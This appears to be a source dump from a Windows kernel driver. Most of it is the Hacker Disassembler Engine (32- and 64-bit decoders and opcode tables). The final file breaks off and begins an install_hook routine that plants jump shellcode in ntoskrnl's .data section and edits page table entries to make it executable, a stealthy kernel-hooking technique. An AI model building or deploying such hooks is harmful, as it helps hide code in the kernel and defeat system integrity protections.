						if (!((*ht << m_reg) & 0x80))
							goto no_lock_error;
						else
							break;
					}
				hs->flags |= F_ERROR | F_ERROR_LOCK;
			no_lock_error:
				;
			}
		}

		if (hs->opcode2) {
			switch (opcode) {
			case 0x20: case 0x22:
				m_mod = 3;
				if (m_reg > 4 || m_reg == 1)
					goto error_operand;
				else
					goto no_error_operand;
			case 0x21: case 0x23:
				m_mod = 3;
				if (m_reg == 4 || m_reg == 5)
					goto error_operand;
				else
					goto no_error_operand;
			}
		}
		else {
			switch (opcode) {
			case 0x8c:
				if (m_reg > 5)
					goto error_operand;
				else
					goto no_error_operand;
			case 0x8e:
				if (m_reg == 1 || m_reg > 5)
					goto error_operand;
				else
					goto no_error_operand;
			}
		}

		if (m_mod == 3) {
			uint8_t* table_end;
			if (hs->opcode2) {
				ht = hde32_table + DELTA_OP2_ONLY_MEM;
				table_end = ht + sizeof(hde32_table) - DELTA_OP2_ONLY_MEM;
			}
			else {
				ht = hde32_table + DELTA_OP_ONLY_MEM;
				table_end = ht + DELTA_OP2_ONLY_MEM - DELTA_OP_ONLY_MEM;
			}
			for (; ht != table_end; ht += 2)
				if (*ht++ == opcode) {
					if (*ht++ & pref && !((*ht << m_reg) & 0x80))
						goto error_operand;
					else
						break;
				}
			goto no_error_operand;
		}
		else if (hs->opcode2) {
			switch (opcode) {
			case 0x50: case 0xd7: case 0xf7:
				if (pref & (PRE_NONE | PRE_66))
					goto error_operand;
				break;
			case 0xd6:
				if (pref & (PRE_F2 | PRE_F3))
					goto error_operand;
				break;
			case 0xc5:
				goto error_operand;
			}
			goto no_error_operand;
		}
		else
			goto no_error_operand;

	error_operand:
		hs->flags |= F_ERROR | F_ERROR_OPERAND;
	no_error_operand:

		c = *p++;
		if (m_reg <= 1) {
			if (opcode == 0xf6)
				cflags |= C_IMM8;
			else if (opcode == 0xf7)
				cflags |= C_IMM_P66;
		}

		switch (m_mod) {
		case 0:
			if (pref & PRE_67) {
				if (m_rm == 6)
					disp_size = 2;
			}
			else
				if (m_rm == 5)
					disp_size = 4;
			break;
		case 1:
			disp_size = 1;
			break;
		case 2:
			disp_size = 2;
			if (!(pref & PRE_67))
				disp_size <<= 1;
		}

		if (m_mod != 3 && m_rm == 4 && !(pref & PRE_67)) {
			hs->flags |= F_SIB;
			p++;
			hs->sib = c;
			hs->sib_scale = c >> 6;
			hs->sib_index = (c & 0x3f) >> 3;
			if ((hs->sib_base = c & 7) == 5 && !(m_mod & 1))
				disp_size = 4;
		}

		p--;
		switch (disp_size) {
		case 1:
			hs->flags |= F_DISP8;
			hs->disp.disp8 = *p;
			break;
		case 2:
			hs->flags |= F_DISP16;
			hs->disp.disp16 = *(uint16_t*)p;
			break;
		case 4:
			hs->flags |= F_DISP32;
			hs->disp.disp32 = *(uint32_t*)p;
		}
		p += disp_size;
	}
	else if (pref & PRE_LOCK)
		hs->flags |= F_ERROR | F_ERROR_LOCK;

	if (cflags & C_IMM_P66) {
		if (cflags & C_REL32) {
			if (pref & PRE_66) {
				hs->flags |= F_IMM16 | F_RELATIVE;
				hs->imm.imm16 = *(uint16_t*)p;
				p += 2;
				goto disasm_done;
			}
			goto rel32_ok;
		}
		if (pref & PRE_66) {
			hs->flags |= F_IMM16;
			hs->imm.imm16 = *(uint16_t*)p;
			p += 2;
		}
		else {
			hs->flags |= F_IMM32;
			hs->imm.imm32 = *(uint32_t*)p;
			p += 4;
		}
	}

	if (cflags & C_IMM16) {
		if (hs->flags & F_IMM32) {
			hs->flags |= F_IMM16;
			hs->disp.disp16 = *(uint16_t*)p;
		}
		else if (hs->flags & F_IMM16) {
			hs->flags |= F_2IMM16;
			hs->disp.disp16 = *(uint16_t*)p;
		}
		else {
			hs->flags |= F_IMM16;
			hs->imm.imm16 = *(uint16_t*)p;
		}
		p += 2;
	}
	if (cflags & C_IMM8) {
		hs->flags |= F_IMM8;
		hs->imm.imm8 = *p++;
	}

	if (cflags & C_REL32) {
	rel32_ok:
		hs->flags |= F_IMM32 | F_RELATIVE;
		hs->imm.imm32 = *(uint32_t*)p;
		p += 4;
	}
	else if (cflags & C_REL8) {
		hs->flags |= F_IMM8 | F_RELATIVE;
		hs->imm.imm8 = *p++;
	}

disasm_done:

	if ((hs->len = (uint8_t)(p - (uint8_t*)code)) > 15) {
		hs->flags |= F_ERROR | F_ERROR_LENGTH;
		hs->len = 15;
	}

	return (unsigned int)hs->len;
}

#pragma warning(pop) // 4701

```

`driver/hde/hde32.h`:

```h
/*
 * Hacker Disassembler Engine 32
 * Copyright (c) 2006-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 * hde32.h: C/C++ header file
 *
 */

#pragma once

#include "hde_stdint.h"

#define F_MODRM         0x00000001
#define F_SIB           0x00000002
#define F_IMM8          0x00000004
#define F_IMM16         0x00000008
#define F_IMM32         0x00000010
#define F_DISP8         0x00000020
#define F_DISP16        0x00000040
#define F_DISP32        0x00000080
#define F_RELATIVE      0x00000100
#define F_2IMM16        0x00000800
#define F_ERROR         0x00001000
#define F_ERROR_OPCODE  0x00002000
#define F_ERROR_LENGTH  0x00004000
#define F_ERROR_LOCK    0x00008000
#define F_ERROR_OPERAND 0x00010000
#define F_PREFIX_REPNZ  0x01000000
#define F_PREFIX_REPX   0x02000000
#define F_PREFIX_REP    0x03000000
#define F_PREFIX_66     0x04000000
#define F_PREFIX_67     0x08000000
#define F_PREFIX_LOCK   0x10000000
#define F_PREFIX_SEG    0x20000000
#define F_PREFIX_ANY    0x3f000000

#define PREFIX_SEGMENT_CS   0x2e
#define PREFIX_SEGMENT_SS   0x36
#define PREFIX_SEGMENT_DS   0x3e
#define PREFIX_SEGMENT_ES   0x26
#define PREFIX_SEGMENT_FS   0x64
#define PREFIX_SEGMENT_GS   0x65
#define PREFIX_LOCK         0xf0
#define PREFIX_REPNZ        0xf2
#define PREFIX_REPX         0xf3
#define PREFIX_OPERAND_SIZE 0x66
#define PREFIX_ADDRESS_SIZE 0x67

#pragma pack(push,1)

typedef struct {
    uint8_t len;
    uint8_t p_rep;
    uint8_t p_lock;
    uint8_t p_seg;
    uint8_t p_66;
    uint8_t p_67;
    uint8_t opcode;
    uint8_t opcode2;
    uint8_t modrm;
    uint8_t modrm_mod;
    uint8_t modrm_reg;
    uint8_t modrm_rm;
    uint8_t sib;
    uint8_t sib_scale;
    uint8_t sib_index;
    uint8_t sib_base;
    union {
        uint8_t imm8;
        uint16_t imm16;
        uint32_t imm32;
    } imm;
    union {
        uint8_t disp8;
        uint16_t disp16;
        uint32_t disp32;
    } disp;
    uint32_t flags;
} hde32s;

#pragma pack(pop)

#ifdef __cplusplus
extern "C" {
#endif

/* __cdecl */
unsigned int hde32_disasm(const void *code, hde32s *hs);

#ifdef __cplusplus
}
#endif

```

`driver/hde/hde64.cpp`:

```cpp
/*
 * Hacker Disassembler Engine 64 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#include "hde64.h"

#include <intrin.h>

#include "table64.h"

#pragma warning(push)
#pragma warning(disable:4706)

unsigned int hde64_disasm(const void *code, hde64s *hs)
{
    uint8_t x, c = 0, *p = (uint8_t *)code, cflags, opcode, pref = 0;
    uint8_t *ht = hde64_table, m_mod, m_reg, m_rm, disp_size = 0;
    uint8_t op64 = 0;

    __stosb((unsigned char*)hs, 0, sizeof(hde64s));

    for (x = 16; x; x--)
        switch (c = *p++) {
            case 0xf3:
                hs->p_rep = c;
                pref |= PRE_F3;
                break;
            case 0xf2:
                hs->p_rep = c;
                pref |= PRE_F2;
                break;
            case 0xf0:
                hs->p_lock = c;
                pref |= PRE_LOCK;
                break;
            case 0x26: case 0x2e: case 0x36:
            case 0x3e: case 0x64: case 0x65:
                hs->p_seg = c;
                pref |= PRE_SEG;
                break;
            case 0x66:
                hs->p_66 = c;
                pref |= PRE_66;
                break;
            case 0x67:
                hs->p_67 = c;
                pref |= PRE_67;
                break;
            default:
                goto pref_done;
        }
  pref_done:

    hs->flags = (uint32_t)pref << 23;

    if (!pref)
        pref |= PRE_NONE;

    if ((c & 0xf0) == 0x40) {
        hs->flags |= F_PREFIX_REX;
        if ((hs->rex_w = (c & 0xf) >> 3) && (*p & 0xf8) == 0xb8)
            op64++;
        hs->rex_r = (c & 7) >> 2;
        hs->rex_x = (c & 3) >> 1;
        hs->rex_b = c & 1;
        if (((c = *p++) & 0xf0) == 0x40) {
            opcode = c;
            goto error_opcode;
        }
    }

    if ((hs->opcode = c) == 0x0f) {
        hs->opcode2 = c = *p++;
        ht += DELTA_OPCODES;
    } else if (c >= 0xa0 && c <= 0xa3) {
        op64++;
        if (pref & PRE_67)
            pref |= PRE_66;
        else
            pref &= ~PRE_66;
    }

    opcode = c;
    cflags = ht[ht[opcode / 4] + (opcode % 4)];

    if (cflags == C_ERROR) {
      error_opcode:
        hs->flags |= F_ERROR | F_ERROR_OPCODE;
        cflags = 0;
        if ((opcode & -3) == 0x24)
            cflags++;
    }

    x = 0;
    if (cflags & C_GROUP) {
        uint16_t t;
        t = *(uint16_t *)(ht + (cflags & 0x7f));
        cflags = (uint8_t)t;
        x = (uint8_t)(t >> 8);
    }

    if (hs->opcode2) {
        ht = hde64_table + DELTA_PREFIXES;
        if (ht[ht[opcode / 4] + (opcode % 4)] & pref)
            hs->flags |= F_ERROR | F_ERROR_OPCODE;
    }

    if (cflags & C_MODRM) {
        hs->flags |= F_MODRM;
        hs->modrm = c = *p++;
        hs->modrm_mod = m_mod = c >> 6;
        hs->modrm_rm = m_rm = c & 7;
        hs->modrm_reg = m_reg = (c & 0x3f) >> 3;

        if (x && ((x << m_reg) & 0x80))
            hs->flags |= F_ERROR | F_ERROR_OPCODE;

        if (!hs->opcode2 && opcode >= 0xd9 && opcode <= 0xdf) {
            uint8_t t = opcode - 0xd9;
            if (m_mod == 3) {
                ht = hde64_table + DELTA_FPU_MODRM + t*8;
                t = ht[m_reg] << m_rm;
            } else {
                ht = hde64_table + DELTA_FPU_REG;
                t = ht[t] << m_reg;
            }
            if (t & 0x80)
                hs->flags |= F_ERROR | F_ERROR_OPCODE;
        }

        if (pref & PRE_LOCK) {
            if (m_mod == 3) {
                hs->flags |= F_ERROR | F_ERROR_LOCK;
            } else {
                uint8_t *table_end, op = opcode;
                if (hs->opcode2) {
                    ht = hde64_table + DELTA_OP2_LOCK_OK;
                    table_end = ht + DELTA_OP_ONLY_MEM - DELTA_OP2_LOCK_OK;
                } else {
                    ht = hde64_table + DELTA_OP_LOCK_OK;
                    table_end = ht + DELTA_OP2_LOCK_OK - DELTA_OP_LOCK_OK;
                    op &= -2;
                }
                for (; ht != table_end; ht++)
                    if (*ht++ == op) {
                        if (!((*ht << m_reg) & 0x80))
                            goto no_lock_error;
                        else
                            break;
                    }
                hs->flags |= F_ERROR | F_ERROR_LOCK;
              no_lock_error:
                ;
            }
        }

        if (hs->opcode2) {
            switch (opcode) {
                case 0x20: case 0x22:
                    m_mod = 3;
                    if (m_reg > 4 || m_reg == 1)
                        goto error_operand;
                    else
                        goto no_error_operand;
                case 0x21: case 0x23:
                    m_mod = 3;
                    if (m_reg == 4 || m_reg == 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
            }
        } else {
            switch (opcode) {
                case 0x8c:
                    if (m_reg > 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
                case 0x8e:
                    if (m_reg == 1 || m_reg > 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
            }
        }

        if (m_mod == 3) {
            uint8_t *table_end;
            if (hs->opcode2) {
                ht = hde64_table + DELTA_OP2_ONLY_MEM;
                table_end = ht + sizeof(hde64_table) - DELTA_OP2_ONLY_MEM;
            } else {
                ht = hde64_table + DELTA_OP_ONLY_MEM;
                table_end = ht + DELTA_OP2_ONLY_MEM - DELTA_OP_ONLY_MEM;
            }
            for (; ht != table_end; ht += 2)
                if (*ht++ == opcode) {
                    if (*ht++ & pref && !((*ht << m_reg) & 0x80))
                        goto error_operand;
                    else
                        break;
                }
            goto no_error_operand;
        } else if (hs->opcode2) {
            switch (opcode) {
                case 0x50: case 0xd7: case 0xf7:
                    if (pref & (PRE_NONE | PRE_66))
                        goto error_operand;
                    break;
                case 0xd6:
                    if (pref & (PRE_F2 | PRE_F3))
                        goto error_operand;
                    break;
                case 0xc5:
                    goto error_operand;
            }
            goto no_error_operand;
        } else
            goto no_error_operand;

      error_operand:
        hs->flags |= F_ERROR | F_ERROR_OPERAND;
      no_error_operand:

        c = *p++;
        if (m_reg <= 1) {
            if (opcode == 0xf6)
                cflags |= C_IMM8;
            else if (opcode == 0xf7)
                cflags |= C_IMM_P66;
        }

        switch (m_mod) {
            case 0:
                if (pref & PRE_67) {
                    if (m_rm == 6)
                        disp_size = 2;
                } else
                    if (m_rm == 5)
                        disp_size = 4;
                break;
            case 1:
                disp_size = 1;
                break;
            case 2:
                disp_size = 2;
                if (!(pref & PRE_67))
                    disp_size <<= 1;
        }

        if (m_mod != 3 && m_rm == 4) {
            hs->flags |= F_SIB;
            p++;
            hs->sib = c;
            hs->sib_scale = c >> 6;
            hs->sib_index = (c & 0x3f) >> 3;
            if ((hs->sib_base = c & 7) == 5 && !(m_mod & 1))
                disp_size = 4;
        }

        p--;
        switch (disp_size) {
            case 1:
                hs->flags |= F_DISP8;
                hs->disp.disp8 = *p;
                break;
            case 2:
                hs->flags |= F_DISP16;
                hs->disp.disp16 = *(uint16_t *)p;
                break;
            case 4:
                hs->flags |= F_DISP32;
                hs->disp.disp32 = *(uint32_t *)p;
        }
        p += disp_size;
    } else if (pref & PRE_LOCK)
        hs->flags |= F_ERROR | F_ERROR_LOCK;

    if (cflags & C_IMM_P66) {
        if (cflags & C_REL32) {
            if (pref & PRE_66) {
                hs->flags |= F_IMM16 | F_RELATIVE;
                hs->imm.imm16 = *(uint16_t *)p;
                p += 2;
                goto disasm_done;
            }
            goto rel32_ok;
        }
        if (op64) {
            hs->flags |= F_IMM64;
            hs->imm.imm64 = *(uint64_t *)p;
            p += 8;
        } else if (!(pref & PRE_66)) {
            hs->flags |= F_IMM32;
            hs->imm.imm32 = *(uint32_t *)p;
            p += 4;
        } else
            goto imm16_ok;
    }


    if (cflags & C_IMM16) {
      imm16_ok:
        hs->flags |= F_IMM16;
        hs->imm.imm16 = *(uint16_t *)p;
        p += 2;
    }
    if (cflags & C_IMM8) {
        hs->flags |= F_IMM8;
        hs->imm.imm8 = *p++;
    }

    if (cflags & C_REL32) {
      rel32_ok:
        hs->flags |= F_IMM32 | F_RELATIVE;
        hs->imm.imm32 = *(uint32_t *)p;
        p += 4;
    } else if (cflags & C_REL8) {
        hs->flags |= F_IMM8 | F_RELATIVE;
        hs->imm.imm8 = *p++;
    }

  disasm_done:

    if ((hs->len = (uint8_t)(p-(uint8_t *)code)) > 15) {
        hs->flags |= F_ERROR | F_ERROR_LENGTH;
        hs->len = 15;
    }

    return (unsigned int)hs->len;
}

#pragma warning(pop) // 4706

```

`driver/hde/hde64.h`:

```h
/*
 * Hacker Disassembler Engine 64
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 * hde64.h: C/C++ header file
 *
 */

#pragma once

#include "hde_stdint.h"

#define F_MODRM         0x00000001
#define F_SIB           0x00000002
#define F_IMM8          0x00000004
#define F_IMM16         0x00000008
#define F_IMM32         0x00000010
#define F_IMM64         0x00000020
#define F_DISP8         0x00000040
#define F_DISP16        0x00000080
#define F_DISP32        0x00000100
#define F_RELATIVE      0x00000200
#define F_ERROR         0x00001000
#define F_ERROR_OPCODE  0x00002000
#define F_ERROR_LENGTH  0x00004000
#define F_ERROR_LOCK    0x00008000
#define F_ERROR_OPERAND 0x00010000
#define F_PREFIX_REPNZ  0x01000000
#define F_PREFIX_REPX   0x02000000
#define F_PREFIX_REP    0x03000000
#define F_PREFIX_66     0x04000000
#define F_PREFIX_67     0x08000000
#define F_PREFIX_LOCK   0x10000000
#define F_PREFIX_SEG    0x20000000
#define F_PREFIX_REX    0x40000000
#define F_PREFIX_ANY    0x7f000000

#define PREFIX_SEGMENT_CS   0x2e
#define PREFIX_SEGMENT_SS   0x36
#define PREFIX_SEGMENT_DS   0x3e
#define PREFIX_SEGMENT_ES   0x26
#define PREFIX_SEGMENT_FS   0x64
#define PREFIX_SEGMENT_GS   0x65
#define PREFIX_LOCK         0xf0
#define PREFIX_REPNZ        0xf2
#define PREFIX_REPX         0xf3
#define PREFIX_OPERAND_SIZE 0x66
#define PREFIX_ADDRESS_SIZE 0x67

#pragma pack(push,1)

typedef struct {
    uint8_t len;
    uint8_t p_rep;
    uint8_t p_lock;
    uint8_t p_seg;
    uint8_t p_66;
    uint8_t p_67;
    uint8_t rex;
    uint8_t rex_w;
    uint8_t rex_r;
    uint8_t rex_x;
    uint8_t rex_b;
    uint8_t opcode;
    uint8_t opcode2;
    uint8_t modrm;
    uint8_t modrm_mod;
    uint8_t modrm_reg;
    uint8_t modrm_rm;
    uint8_t sib;
    uint8_t sib_scale;
    uint8_t sib_index;
    uint8_t sib_base;
    union {
        uint8_t imm8;
        uint16_t imm16;
        uint32_t imm32;
        uint64_t imm64;
    } imm;
    union {
        uint8_t disp8;
        uint16_t disp16;
        uint32_t disp32;
    } disp;
    uint32_t flags;
} hde64s;

#pragma pack(pop)

#ifdef __cplusplus
extern "C" {
#endif

/* __cdecl */
unsigned int hde64_disasm(const void *code, hde64s *hs);

#ifdef __cplusplus
}
#endif

```

`driver/hde/hde_stdint.h`:

```h
#pragma once

#include <basetsd.h>

typedef INT8   int8_t;
typedef INT16  int16_t;
typedef INT32  int32_t;
typedef INT64  int64_t;
typedef UINT8  uint8_t;
typedef UINT16 uint16_t;
typedef UINT32 uint32_t;
typedef UINT64 uint64_t;

```

`driver/hde/table32.h`:

```h
/*
 * Hacker Disassembler Engine 32 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#pragma once

#define C_NONE    0x00
#define C_MODRM   0x01
#define C_IMM8    0x02
#define C_IMM16   0x04
#define C_IMM_P66 0x10
#define C_REL8    0x20
#define C_REL32   0x40
#define C_GROUP   0x80
#define C_ERROR   0xff

#define PRE_ANY  0x00
#define PRE_NONE 0x01
#define PRE_F2   0x02
#define PRE_F3   0x04
#define PRE_66   0x08
#define PRE_67   0x10
#define PRE_LOCK 0x20
#define PRE_SEG  0x40
#define PRE_ALL  0xff

#define DELTA_OPCODES      0x4a
#define DELTA_FPU_REG      0xf1
#define DELTA_FPU_MODRM    0xf8
#define DELTA_PREFIXES     0x130
#define DELTA_OP_LOCK_OK   0x1a1
#define DELTA_OP2_LOCK_OK  0x1b9
#define DELTA_OP_ONLY_MEM  0x1cb
#define DELTA_OP2_ONLY_MEM 0x1da

unsigned char hde32_table[] = {
  0xa3,0xa8,0xa3,0xa8,0xa3,0xa8,0xa3,0xa8,0xa3,0xa8,0xa3,0xa8,0xa3,0xa8,0xa3,
  0xa8,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xac,0xaa,0xb2,0xaa,0x9f,0x9f,
  0x9f,0x9f,0xb5,0xa3,0xa3,0xa4,0xaa,0xaa,0xba,0xaa,0x96,0xaa,0xa8,0xaa,0xc3,
  0xc3,0x96,0x96,0xb7,0xae,0xd6,0xbd,0xa3,0xc5,0xa3,0xa3,0x9f,0xc3,0x9c,0xaa,
  0xaa,0xac,0xaa,0xbf,0x03,0x7f,0x11,0x7f,0x01,0x7f,0x01,0x3f,0x01,0x01,0x90,
  0x82,0x7d,0x97,0x59,0x59,0x59,0x59,0x59,0x7f,0x59,0x59,0x60,0x7d,0x7f,0x7f,
  0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x9a,0x88,0x7d,
  0x59,0x50,0x50,0x50,0x50,0x59,0x59,0x59,0x59,0x61,0x94,0x61,0x9e,0x59,0x59,
  0x85,0x59,0x92,0xa3,0x60,0x60,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,
  0x59,0x59,0x9f,0x01,0x03,0x01,0x04,0x03,0xd5,0x03,0xcc,0x01,0xbc,0x03,0xf0,
  0x10,0x10,0x10,0x10,0x50,0x50,0x50,0x50,0x14,0x20,0x20,0x20,0x20,0x01,0x01,
  0x01,0x01,0xc4,0x02,0x10,0x00,0x00,0x00,0x00,0x01,0x01,0xc0,0xc2,0x10,0x11,
  0x02,0x03,0x11,0x03,0x03,0x04,0x00,0x00,0x14,0x00,0x02,0x00,0x00,0xc6,0xc8,
  0x02,0x02,0x02,0x02,0x00,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0xff,0xca,
  0x01,0x01,0x01,0x00,0x06,0x00,0x04,0x00,0xc0,0xc2,0x01,0x01,0x03,0x01,0xff,
  0xff,0x01,0x00,0x03,0xc4,0xc4,0xc6,0x03,0x01,0x01,0x01,0xff,0x03,0x03,0x03,
  0xc8,0x40,0x00,0x0a,0x00,0x04,0x00,0x00,0x00,0x00,0x7f,0x00,0x33,0x01,0x00,
  0x00,0x00,0x00,0x00,0x00,0xff,0xbf,0xff,0xff,0x00,0x00,0x00,0x00,0x07,0x00,
  0x00,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0xff,0xff,0x00,0x00,0x00,0xbf,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x7f,0x00,0x00,0xff,0x4a,0x4a,0x4a,0x4a,0x4b,0x52,0x4a,0x4a,0x4a,0x4a,0x4f,
  0x4c,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x55,0x45,0x40,0x4a,0x4a,0x4a,
  0x45,0x59,0x4d,0x46,0x4a,0x5d,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,
  0x4a,0x4a,0x4a,0x4a,0x4a,0x61,0x63,0x67,0x4e,0x4a,0x4a,0x6b,0x6d,0x4a,0x4a,
  0x45,0x6d,0x4a,0x4a,0x44,0x45,0x4a,0x4a,0x00,0x00,0x00,0x02,0x0d,0x06,0x06,
  0x06,0x06,0x0e,0x00,0x00,0x00,0x00,0x06,0x06,0x06,0x00,0x06,0x06,0x02,0x06,
  0x00,0x0a,0x0a,0x07,0x07,0x06,0x02,0x05,0x05,0x02,0x02,0x00,0x00,0x04,0x04,
  0x04,0x04,0x00,0x00,0x00,0x0e,0x05,0x06,0x06,0x06,0x01,0x06,0x00,0x00,0x08,
  0x00,0x10,0x00,0x18,0x00,0x20,0x00,0x28,0x00,0x30,0x00,0x80,0x01,0x82,0x01,
  0x86,0x00,0xf6,0xcf,0xfe,0x3f,0xab,0x00,0xb0,0x00,0xb1,0x00,0xb3,0x00,0xba,
  0xf8,0xbb,0x00,0xc0,0x00,0xc1,0x00,0xc7,0xbf,0x62,0xff,0x00,0x8d,0xff,0x00,
  0xc4,0xff,0x00,0xc5,0xff,0x00,0xff,0xff,0xeb,0x01,0xff,0x0e,0x12,0x08,0x00,
  0x13,0x09,0x00,0x16,0x08,0x00,0x17,0x09,0x00,0x2b,0x09,0x00,0xae,0xff,0x07,
  0xb2,0xff,0x00,0xb4,0xff,0x00,0xb5,0xff,0x00,0xc3,0x01,0x00,0xc7,0xff,0xbf,
  0xe7,0x08,0x00,0xf0,0x02,0x00
};

```

`driver/hde/table64.h`:

```h
/*
 * Hacker Disassembler Engine 64 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#pragma once

#define C_NONE    0x00
#define C_MODRM   0x01
#define C_IMM8    0x02
#define C_IMM16   0x04
#define C_IMM_P66 0x10
#define C_REL8    0x20
#define C_REL32   0x40
#define C_GROUP   0x80
#define C_ERROR   0xff

#define PRE_ANY  0x00
#define PRE_NONE 0x01
#define PRE_F2   0x02
#define PRE_F3   0x04
#define PRE_66   0x08
#define PRE_67   0x10
#define PRE_LOCK 0x20
#define PRE_SEG  0x40
#define PRE_ALL  0xff

#define DELTA_OPCODES      0x4a
#define DELTA_FPU_REG      0xfd
#define DELTA_FPU_MODRM    0x104
#define DELTA_PREFIXES     0x13c
#define DELTA_OP_LOCK_OK   0x1ae
#define DELTA_OP2_LOCK_OK  0x1c6
#define DELTA_OP_ONLY_MEM  0x1d8
#define DELTA_OP2_ONLY_MEM 0x1e7

unsigned char hde64_table[] = {
  0xa5,0xaa,0xa5,0xb8,0xa5,0xaa,0xa5,0xaa,0xa5,0xb8,0xa5,0xb8,0xa5,0xb8,0xa5,
  0xb8,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xac,0xc0,0xcc,0xc0,0xa1,0xa1,
  0xa1,0xa1,0xb1,0xa5,0xa5,0xa6,0xc0,0xc0,0xd7,0xda,0xe0,0xc0,0xe4,0xc0,0xea,
  0xea,0xe0,0xe0,0x98,0xc8,0xee,0xf1,0xa5,0xd3,0xa5,0xa5,0xa1,0xea,0x9e,0xc0,
  0xc0,0xc2,0xc0,0xe6,0x03,0x7f,0x11,0x7f,0x01,0x7f,0x01,0x3f,0x01,0x01,0xab,
  0x8b,0x90,0x64,0x5b,0x5b,0x5b,0x5b,0x5b,0x92,0x5b,0x5b,0x76,0x90,0x92,0x92,
  0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x6a,0x73,0x90,
  0x5b,0x52,0x52,0x52,0x52,0x5b,0x5b,0x5b,0x5b,0x77,0x7c,0x77,0x85,0x5b,0x5b,
  0x70,0x5b,0x7a,0xaf,0x76,0x76,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,
  0x5b,0x5b,0x86,0x01,0x03,0x01,0x04,0x03,0xd5,0x03,0xd5,0x03,0xcc,0x01,0xbc,
  0x03,0xf0,0x03,0x03,0x04,0x00,0x50,0x50,0x50,0x50,0xff,0x20,0x20,0x20,0x20,
  0x01,0x01,0x01,0x01,0xc4,0x02,0x10,0xff,0xff,0xff,0x01,0x00,0x03,0x11,0xff,
  0x03,0xc4,0xc6,0xc8,0x02,0x10,0x00,0xff,0xcc,0x01,0x01,0x01,0x00,0x00,0x00,
  0x00,0x01,0x01,0x03,0x01,0xff,0xff,0xc0,0xc2,0x10,0x11,0x02,0x03,0x01,0x01,
  0x01,0xff,0xff,0xff,0x00,0x00,0x00,0xff,0x00,0x00,0xff,0xff,0xff,0xff,0x10,
  0x10,0x10,0x10,0x02,0x10,0x00,0x00,0xc6,0xc8,0x02,0x02,0x02,0x02,0x06,0x00,
  0x04,0x00,0x02,0xff,0x00,0xc0,0xc2,0x01,0x01,0x03,0x03,0x03,0xca,0x40,0x00,
  0x0a,0x00,0x04,0x00,0x00,0x00,0x00,0x7f,0x00,0x33,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0xff,0xbf,0xff,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0xff,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,
  0x00,0x00,0x00,0xbf,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x7f,0x00,0x00,
  0xff,0x40,0x40,0x40,0x40,0x41,0x49,0x40,0x40,0x40,0x40,0x4c,0x42,0x40,0x40,
  0x40,0x40,0x40,0x40,0x40,0x40,0x4f,0x44,0x53,0x40,0x40,0x40,0x44,0x57,0x43,
  0x5c,0x40,0x60,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,
  0x40,0x40,0x64,0x66,0x6e,0x6b,0x40,0x40,0x6a,0x46,0x40,0x40,0x44,0x46,0x40,
  0x40,0x5b,0x44,0x40,0x40,0x00,0x00,0x00,0x00,0x06,0x06,0x06,0x06,0x01,0x06,
  0x06,0x02,0x06,0x06,0x00,0x06,0x00,0x0a,0x0a,0x00,0x00,0x00,0x02,0x07,0x07,
  0x06,0x02,0x0d,0x06,0x06,0x06,0x0e,0x05,0x05,0x02,0x02,0x00,0x00,0x04,0x04,
  0x04,0x04,0x05,0x06,0x06,0x06,0x00,0x00,0x00,0x0e,0x00,0x00,0x08,0x00,0x10,
  0x00,0x18,0x00,0x20,0x00,0x28,0x00,0x30,0x00,0x80,0x01,0x82,0x01,0x86,0x00,
  0xf6,0xcf,0xfe,0x3f,0xab,0x00,0xb0,0x00,0xb1,0x00,0xb3,0x00,0xba,0xf8,0xbb,
  0x00,0xc0,0x00,0xc1,0x00,0xc7,0xbf,0x62,0xff,0x00,0x8d,0xff,0x00,0xc4,0xff,
  0x00,0xc5,0xff,0x00,0xff,0xff,0xeb,0x01,0xff,0x0e,0x12,0x08,0x00,0x13,0x09,
  0x00,0x16,0x08,0x00,0x17,0x09,0x00,0x2b,0x09,0x00,0xae,0xff,0x07,0xb2,0xff,
  0x00,0xb4,0xff,0x00,0xb5,0xff,0x00,0xc3,0x01,0x00,0xc7,0xff,0xbf,0xe7,0x08,
  0x00,0xf0,0x02,0x00
};

```

`driver/init.hpp`:

```hpp
#pragma once
#include "./def/globals.hpp"
namespace init {

  /**
   * @brief Install function hook by placing shellcode in ntoskrnl .data section
   * @param func Pointer to the hook handler function
   * @return NTSTATUS indicating success or failure
   *
   * Creates and deploys shellcode that redirects execution to the specified
   * handler using push/ret technique. Finds unused space in ntoskrnl's .data section,
   * writes shellcode, modifies PTEs for execution permission, and updates the hook
   * address for later restoration.
   */
  auto install_hook(const void* func) -> NTSTATUS {
    globals::hook_pointer = *reinterpret_cast<std::uintptr_t*>(globals::hook_address);

    // far jump pattern
    constexpr size_t FAR_JMP_SIZE = 14;
    uint8_t shellcode[FAR_JMP_SIZE] = {0};

    shellcode[0] = 0xFF;  // opcode for indirect jump
